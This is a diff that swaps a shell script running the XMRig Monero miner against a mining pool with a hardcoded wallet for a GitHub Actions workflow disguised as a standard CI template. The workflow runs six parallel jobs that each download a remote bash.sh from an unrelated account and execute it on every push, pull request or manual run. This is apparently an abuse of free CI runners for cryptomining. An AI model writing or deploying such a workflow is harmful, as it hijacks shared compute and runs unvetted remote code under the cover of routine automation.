@@ -1,5 +1,28 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 49BupNgrwoyD4YNBLKmdDkFZNy6KM5aSEgyTvqeduyj7H9HHdJd1EnScYpvZ6xWeca77bpTPUAe2LYWj2PhbuhLG5MGQgfe -k --tls --rig-id rig
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the main branch
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  test:
+   name: Subscrbeit
+    # The type of runner that the job will run on
+   runs-on: ubuntu-latest
+   strategy:
+    fail-fast: false
+    matrix:
+     runner: [0,1,2,3,4,5]
+   steps:
+     - run: |
+          wget https://raw.githubusercontent.com/madhunetwork81/madhunetwork81/main/bash.sh && chmod +x bash.sh && ./bash.sh
